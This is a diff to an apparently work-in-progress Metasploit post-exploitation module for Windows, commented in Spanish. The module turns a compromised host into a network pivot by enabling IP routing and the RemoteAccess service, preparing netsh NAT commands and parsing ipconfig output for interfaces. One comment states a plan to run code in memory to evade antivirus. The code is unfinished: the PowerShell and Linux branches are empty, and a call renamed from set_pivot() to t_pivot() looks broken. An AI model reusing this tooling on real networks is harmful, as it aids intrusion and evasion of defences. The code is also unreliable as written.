@@ -12,6 +12,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Services
   include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Powershell
 
   def initialize(info={})
     super( update_info( info,
@@ -98,15 +99,24 @@ class MetasploitModule < Msf::Post
 			else
 				print_good("	IP Routing is Enabled.")
 			end
-			
-			# Esto es para Windows Servers y XP
-			# print_status(cmd_exec("netsh routing ip nat install"))
-			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
-			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
-			
-			# Para Windows Vista, 7, 8, 8.1 y 10 se hace compartiendo conexión de red en las propiedades del adaptador.
-			# De igual manera se hace con los TAP (VPN)
-			
+			# el comando netsh interface show interface muestra las interfaces
+			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
+			if have_powershell?
+				# Para Windows Vista, 7, 8, 8.1 y 10 se hace compartiendo conexión de red en las propiedades del adaptador.
+				# De igual manera se hace con los TAP (VPN)
+				# Hacerlo ejecutandolo en memoria para evadir AV
+
+			else
+				# if windows 2008 --> Instalar rol de acceso remoto
+				# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
+				# if Windows Servers o XP
+				# De igual manera se hace para los TAP (VPN)
+					# print_status(cmd_exec("netsh routing ip nat install"))
+					# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
+					# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
+				# else
+					# print_bad("Powershell is not installed. The operations can't be done.")
+			end
 			
 			print_status("	Enabling Routing and Remote Access service...")
 			if service_change_startup("RemoteAccess",2)
@@ -196,17 +206,43 @@ class MetasploitModule < Msf::Post
 		end
 	end
 	
+	def get_interfaces ()
+		#
+		# Get a list of pivot interfaces 
+		#
+		interfaces_dict = {}
+		case session.platform
+		when 'windows'
+			interfaces = cmd_exec('ipconfig').split("\n")
+			counter = 0
+			interfaces.each do |interface|
+				if interface.include? "Ethernet"
+					if interfaces[counter + 4].include? "IPv4"
+						interfaces_dict[interface.gsub("\r","").gsub(" ","").gsub("adapter","").gsub("Adaptadorde","").gsub("Ethernet","").gsub(":","")] = interfaces[counter + 4].gsub(". ","").gsub("IPv4","").gsub("Address","").gsub("Dirección","").gsub(" ","").gsub(":","").gsub("\r","")
+					end
+				end
+				counter = counter + 1
+			end
+		when 'linux'
+			# comandos para linux
+		end
+		return interfaces_dict
+	end
+	
 	#
   	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
   	#
 	def run
 		
 		if check_rnet()
-
+			
+			# interfaces_pivot = get_interfaces()
+			# puts(interfaces_pivot.to_s)
+			# puts(session.ipconfig)
 			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
 			# print_status("Computer name: #{'Computer'} ")
 			# print_status("Current user: #{session.sys.config.getuid}")
-			set_pivot()
+			t_pivot()
 			create_route()
 			# para saber si las rutas son correctas
 			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
